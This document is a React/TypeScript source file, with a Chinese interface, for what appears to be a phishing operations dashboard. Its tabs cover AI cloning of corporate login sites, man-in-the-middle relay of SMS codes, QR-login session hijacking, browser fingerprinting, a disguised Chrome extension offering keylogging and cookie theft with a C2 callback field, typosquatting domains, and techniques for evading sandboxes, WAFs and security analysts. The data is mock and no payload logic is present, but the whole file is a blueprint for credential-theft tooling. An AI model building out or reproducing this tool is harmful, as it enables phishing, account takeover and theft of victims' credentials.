import { useState } from 'react'
import {
  Tabs,
  Card,
  Button,
  Table,
  Tag,
  Input,
  Space,
  Typography,
  Form,
  Select,
  Switch,
  Divider,
  Tooltip,
  Row,
  Col,
  Statistic,
  Steps,
  Alert,
  List,
  Upload,
} from 'antd'
import type { ColumnsType } from 'antd/es/table'
import {
  GlobalOutlined,
  PhoneOutlined,
  QrcodeOutlined,
  ChromeOutlined,
  LaptopOutlined,
  KeyOutlined,
  CloudServerOutlined,
  SafetyOutlined,
  PlusOutlined,
  PlayCircleOutlined,
  CopyOutlined,
  EyeOutlined,
  EditOutlined,
  DeleteOutlined,
  ReloadOutlined,
  SendOutlined,
  LinkOutlined,
  SecurityScanOutlined,
  AimOutlined,
  RobotOutlined,
  ApiOutlined,
  CodeOutlined,
  InboxOutlined,
  CheckCircleOutlined,
} from '@ant-design/icons'
import './WebsitePhishing.css'

const { Title, Text, Paragraph } = Typography
const { TextArea } = Input

interface SiteTemplate {
  id: string; name: string; target: string; similarity: number
  status: 'active' | 'draft' | 'expired'; visits: number; captures: number; created: string
}

interface DomainItem {
  id: string; domain: string; type: string; status: 'active' | 'pending' | 'blocked'
  ssl: boolean; registrar: string; expires: string
}

const MOCK_SITES: SiteTemplate[] = [
  { id: '1', name: '企业 OA 登录', target: 'oa.example.com', similarity: 97, status: 'active', visits: 234, captures: 18, created: '2026-05-28' },
  { id: '2', name: '邮箱登录页', target: 'mail.corp.com', similarity: 95, status: 'active', visits: 156, captures: 12, created: '2026-05-27' },
  { id: '3', name: 'VPN 客户端', target: 'vpn.company.cn', similarity: 92, status: 'draft', visits: 0, captures: 0, created: '2026-05-30' },
]

const MOCK_DOMAINS: DomainItem[] = [
  { id: '1', domain: 'oa-example.com', type: '相似域名', status: 'active', ssl: true, registrar: 'Namecheap', expires: '2027-05-01' },
  { id: '2', domain: 'mail-corp.net', type: 'typosquatting', status: 'active', ssl: true, registrar: 'GoDaddy', expires: '2027-03-15' },
  { id: '3', domain: 'vpn-company.cn', type: '同音域名', status: 'pending', ssl: false, registrar: 'Dynadot', expires: '2027-06-01' },
]

export default function WebsitePhishing() {
  const [activeTab, setActiveTab] = useState('ai-clone')

  const renderAIClone = () => (
    <div className="tab-content">
      <Card className="glass-card" style={{ marginBottom: 16 }}>
        <Row gutter={24}>
          <Col span={6}><Statistic title="活跃站点" value={2} prefix={<GlobalOutlined />} /></Col>
          <Col span={6}><Statistic title="总访问量" value={390} prefix={<EyeOutlined />} /></Col>
          <Col span={6}><Statistic title="总捕获" value={30} prefix={<AimOutlined />} valueStyle={{ color: '#52c41a' }} /></Col>
          <Col span={6}><Statistic title="平均相似度" value={94.7} suffix="%" prefix={<CheckCircleOutlined />} /></Col>
        </Row>
      </Card>
      <Card className="glass-card" title={<Space><RobotOutlined /> AI 仿站管理</Space>}
        extra={<Button type="primary" icon={<PlusOutlined />}>新建仿站</Button>}
      >
        <Alert message="AI 引擎基于目标 URL 自动抓取页面结构、样式和交互，生成高度还原的克隆站点，并对接后端真实接口" type="info" showIcon style={{ marginBottom: 16 }} />
        <Table columns={[
          { title: '站点名称', dataIndex: 'name', key: 'name', render: (t: string) => <Text strong>{t}</Text> },
          { title: '目标域名', dataIndex: 'target', key: 'target', render: (t: string) => <Text code>{t}</Text> },
          { title: '相似度', dataIndex: 'similarity', key: 'similarity', render: (v: number) => <Tag color={v >= 95 ? 'green' : v >= 90 ? 'blue' : 'orange'}>{v}%</Tag> },
          { title: '状态', dataIndex: 'status', key: 'status', render: (s: string) => {
            const m: Record<string, { color: string; text: string }> = { active: { color: 'green', text: '运行中' }, draft: { color: 'default', text: '草稿' }, expired: { color: 'red', text: '已过期' } }
            const c = m[s] || m.draft; return <Tag color={c.color}>{c.text}</Tag>
          }},
          { title: '访问量', dataIndex: 'visits', key: 'visits' },
          { title: '捕获数', dataIndex: 'captures', key: 'captures', render: (v: number) => <Text type={v > 0 ? 'success' : 'secondary'}>{v}</Text> },
          { title: '操作', key: 'action', render: () => (
            <Space size="small">
              <Tooltip title="预览"><Button type="text" size="small" icon={<EyeOutlined />} /></Tooltip>
              <Tooltip title="编辑"><Button type="text" size="small" icon={<EditOutlined />} /></Tooltip>
              <Tooltip title="复制链接"><Button type="text" size="small" icon={<CopyOutlined />} /></Tooltip>
            </Space>
          )},
        ] as ColumnsType<SiteTemplate>} dataSource={MOCK_SITES} rowKey="id" pagination={false} />
      </Card>
    </div>
  )

  const renderSmsIntercept = () => (
    <div className="tab-content">
      <Card className="glass-card" title={<Space><PhoneOutlined /> 验证码拦截配置</Space>}>
        <Alert message="通过中间人代理将真实验证码接口对接到钓鱼站点，用户输入手机号后自动触发真实接口" type="warning" showIcon style={{ marginBottom: 16 }} />
        <Form layout="vertical" style={{ maxWidth: 600 }}>
          <Form.Item label="目标验证码接口"><Input placeholder="https://api.target.com/sms/send" prefix={<ApiOutlined />} /></Form.Item>
          <Form.Item label="请求方法"><Select defaultValue="POST" options={[{ value: 'POST' }, { value: 'GET' }]} /></Form.Item>
          <Form.Item label="请求头 (JSON)"><TextArea rows={3} placeholder='{"Content-Type": "application/json"}' /></Form.Item>
          <Form.Item label="请求体模板"><TextArea rows={3} placeholder='{"phone": "{{phone}}", "type": "login"}' /></Form.Item>
          <Form.Item label="自动转发">
            <Switch defaultChecked /><Text type="secondary" style={{ marginLeft: 8 }}>用户输入手机号后自动触发</Text>
          </Form.Item>
          <Form.Item>
            <Space>
              <Button type="primary" icon={<PlayCircleOutlined />}>保存并启用</Button>
              <Button icon={<CodeOutlined />}>测试接口</Button>
            </Space>
          </Form.Item>
        </Form>
      </Card>
    </div>
  )

  const renderQrForge = () => (
    <div className="tab-content">
      <Card className="glass-card" title={<Space><QrcodeOutlined /> 扫码伪造</Space>}>
        <Alert message="实时获取真实站点的扫码 session 并包装为钓鱼页面，目标扫码后捕获登录凭证" type="warning" showIcon style={{ marginBottom: 16 }} />
        <Steps current={0} direction="vertical" items={[
          { title: '配置目标站点', description: '填写真实扫码登录接口和轮询参数', icon: <LinkOutlined /> },
          { title: '生成钓鱼二维码', description: '系统实时请求真实 QR session，包装为钓鱼页面', icon: <QrcodeOutlined /> },
          { title: '分发与监控', description: '目标扫码后实时捕获登录凭证', icon: <AimOutlined /> },
        ]} />
        <Divider />
        <Form layout="vertical" style={{ maxWidth: 600 }}>
          <Form.Item label="真实扫码接口"><Input placeholder="https://login.target.com/qr/create" prefix={<ApiOutlined />} /></Form.Item>
          <Form.Item label="轮询接口"><Input placeholder="https://login.target.com/qr/poll" prefix={<ReloadOutlined />} /></Form.Item>
          <Form.Item label="绑定钓鱼域名">
            <Select placeholder="选择已配置的域名" options={MOCK_DOMAINS.filter(d => d.status === 'active').map(d => ({ label: d.domain, value: d.id }))} />
          </Form.Item>
          <Form.Item><Button type="primary" icon={<PlusOutlined />}>生成扫码钓鱼页</Button></Form.Item>
        </Form>
      </Card>
    </div>
  )

  const renderBrowserCapture = () => (
    <div className="tab-content">
      <Card className="glass-card" title={<Space><LaptopOutlined /> 浏览器信息采集</Space>}>
        <Paragraph type="secondary">钓鱼页面加载时自动采集访问者的浏览器指纹和环境信息</Paragraph>
        <Divider />
        <Row gutter={[16, 16]}>
          {[
            { label: 'User-Agent', desc: '浏览器和操作系统标识', on: true },
            { label: 'Screen / Window', desc: '屏幕分辨率、窗口尺寸', on: true },
            { label: 'WebGL Fingerprint', desc: 'GPU 渲染指纹', on: true },
            { label: 'Canvas Fingerprint', desc: 'Canvas 渲染指纹', on: true },
            { label: 'Timezone / Language', desc: '时区、语言、区域设置', on: true },
            { label: 'Installed Plugins', desc: '已安装浏览器插件列表', on: false },
            { label: 'Network Info', desc: 'IP、网络类型、代理检测', on: true },
            { label: 'Cookie & Storage', desc: '现有 Cookie 和存储状态', on: false },
          ].map((item) => (
            <Col span={12} key={item.label}>
              <Card size="small" className="glass-card">
                <Space style={{ width: '100%', justifyContent: 'space-between' }}>
                  <div>
                    <Text strong>{item.label}</Text><br />
                    <Text type="secondary" style={{ fontSize: 12 }}>{item.desc}</Text>
                  </div>
                  <Switch defaultChecked={item.on} />
                </Space>
              </Card>
            </Col>
          ))}
        </Row>
      </Card>
    </div>
  )

  const renderChromePayload = () => (
    <div className="tab-content">
      <Card className="glass-card" title={<Space><ChromeOutlined /> Chrome 扩展载荷</Space>}>
        <Alert message="生成伪装的 Chrome 扩展，诱导目标安装后可持久化控制浏览器" type="error" showIcon style={{ marginBottom: 16 }} />
        <Form layout="vertical" style={{ maxWidth: 600 }}>
          <Form.Item label="扩展名称"><Input placeholder="例如：安全更新助手" /></Form.Item>
          <Form.Item label="伪装类型">
            <Select placeholder="选择伪装方式" options={[
              { value: 'security', label: '安全更新助手' }, { value: 'vpn', label: 'VPN 加速工具' },
              { value: 'translate', label: '翻译工具' }, { value: 'custom', label: '自定义' },
            ]} />
          </Form.Item>
          <Form.Item label="载荷功能">
            <Select mode="multiple" placeholder="选择功能模块" options={[
              { value: 'keylogger', label: '键盘记录' }, { value: 'cookie_steal', label: 'Cookie 窃取' },
              { value: 'screenshot', label: '定时截屏' }, { value: 'form_grab', label: '表单抓取' },
              { value: 'proxy', label: '流量代理' },
            ]} />
          </Form.Item>
          <Form.Item label="回传地址"><Input placeholder="https://c2.your-server.com/collect" prefix={<SendOutlined />} /></Form.Item>
          <Form.Item label="图标上传">
            <Upload.Dragger>
              <p className="ant-upload-drag-icon"><InboxOutlined /></p>
              <p className="ant-upload-text">拖拽上传扩展图标</p>
              <p className="ant-upload-hint">建议 128x128 PNG</p>
            </Upload.Dragger>
          </Form.Item>
          <Form.Item>
            <Space>
              <Button type="primary" icon={<CodeOutlined />}>生成 .crx</Button>
              <Button icon={<EyeOutlined />}>预览 manifest</Button>
            </Space>
          </Form.Item>
        </Form>
      </Card>
    </div>
  )

  const renderDomainMgmt = () => (
    <div className="tab-content">
      <Card className="glass-card" title={<Space><KeyOutlined /> 域名管理</Space>}
        extra={<Button type="primary" icon={<PlusOutlined />}>添加域名</Button>}
      >
        <Alert message="域名是钓鱼的核心资产，优先使用 typosquatting、同音字、视觉相似等策略" type="info" showIcon style={{ marginBottom: 16 }} />
        <Table columns={[
          { title: '域名', dataIndex: 'domain', key: 'domain', render: (t: string) => <Text code>{t}</Text> },
          { title: '类型', dataIndex: 'type', key: 'type', render: (t: string) => <Tag>{t}</Tag> },
          { title: '状态', dataIndex: 'status', key: 'status', render: (s: string) => {
            const m: Record<string, { color: string; text: string }> = { active: { color: 'green', text: '可用' }, pending: { color: 'orange', text: '待验证' }, blocked: { color: 'red', text: '已封禁' } }
            const c = m[s] || m.pending; return <Tag color={c.color}>{c.text}</Tag>
          }},
          { title: 'SSL', dataIndex: 'ssl', key: 'ssl', render: (v: boolean) => v ? <Tag color="green">已启用</Tag> : <Tag>未启用</Tag> },
          { title: '注册商', dataIndex: 'registrar', key: 'registrar' },
          { title: '到期', dataIndex: 'expires', key: 'expires' },
          { title: '操作', key: 'action', render: () => (
            <Space size="small">
              <Button type="text" size="small" icon={<EditOutlined />} />
              <Button type="text" size="small" danger icon={<DeleteOutlined />} />
            </Space>
          )},
        ] as ColumnsType<DomainItem>} dataSource={MOCK_DOMAINS} rowKey="id" pagination={false} />
      </Card>
    </div>
  )

  const renderBypass = () => (
    <div className="tab-content">
      <Card className="glass-card" title={<Space><SafetyOutlined /> 网站绕过技术</Space>}>
        <List grid={{ gutter: 16, column: 2 }} dataSource={[
          { title: 'CDN / 反向代理', desc: '通过 Cloudflare Workers / Nginx 反代隐藏真实 IP', icon: <CloudServerOutlined />, status: 'ready' },
          { title: 'WAF 规避', desc: '请求频率控制、UA 轮转、路径随机化规避 WAF', icon: <SecurityScanOutlined />, status: 'beta' },
          { title: 'URL 混淆', desc: '短链接、重定向链、Base64/Unicode 域名混淆', icon: <LinkOutlined />, status: 'ready' },
          { title: '沙箱检测', desc: '检测沙箱环境，非真人访问展示正常页面', icon: <SecurityScanOutlined />, status: 'beta' },
          { title: '地理围栏', desc: '按 IP 地理位置限制，仅对目标区域展示钓鱼内容', icon: <AimOutlined />, status: 'ready' },
          { title: 'JS 混淆加密', desc: '前端 JS 混淆 + 反调试，防安全人员分析', icon: <CodeOutlined />, status: 'ready' },
        ]} renderItem={(item) => (
          <List.Item>
            <Card size="small" className="glass-card hover-float">
              <Space direction="vertical" style={{ width: '100%' }}>
                <Space style={{ width: '100%', justifyContent: 'space-between' }}>
                  <Space>{item.icon}<Text strong>{item.title}</Text></Space>
                  <Tag color={item.status === 'ready' ? 'green' : 'orange'}>{item.status === 'ready' ? '可用' : 'Beta'}</Tag>
                </Space>
                <Text type="secondary" style={{ fontSize: 12 }}>{item.desc}</Text>
                <Button size="small" type="primary" ghost>配置</Button>
              </Space>
            </Card>
          </List.Item>
        )} />
      </Card>
    </div>
  )

  const tabs = [
    { key: 'ai-clone', label: <Space><GlobalOutlined />AI 仿站</Space>, children: renderAIClone() },
    { key: 'sms-intercept', label: <Space><PhoneOutlined />验证码拦截</Space>, children: renderSmsIntercept() },
    { key: 'qr-forge', label: <Space><QrcodeOutlined />扫码伪造</Space>, children: renderQrForge() },
    { key: 'browser-cap', label: <Space><LaptopOutlined />浏览器采集</Space>, children: renderBrowserCapture() },
    { key: 'chrome-ext', label: <Space><ChromeOutlined />Chrome 马</Space>, children: renderChromePayload() },
    { key: 'domain', label: <Space><KeyOutlined />域名管理</Space>, children: renderDomainMgmt() },
    { key: 'bypass', label: <Space><SafetyOutlined />绕过技术</Space>, children: renderBypass() },
  ]

  return (
    <div className="website-phishing-page page-container fade-in">
      <div className="page-header slide-up">
        <div>
          <Title level={2} className="page-title"><GlobalOutlined /> 钓鱼网站</Title>
          <Text type="secondary">AI 仿站、验证码拦截、扫码伪造、浏览器采集、Chrome 马、域名管理与绕过技术</Text>
        </div>
      </div>
      <Tabs activeKey={activeTab} onChange={setActiveTab} items={tabs} size="large" className="phishing-tabs" />
    </div>
  )
}
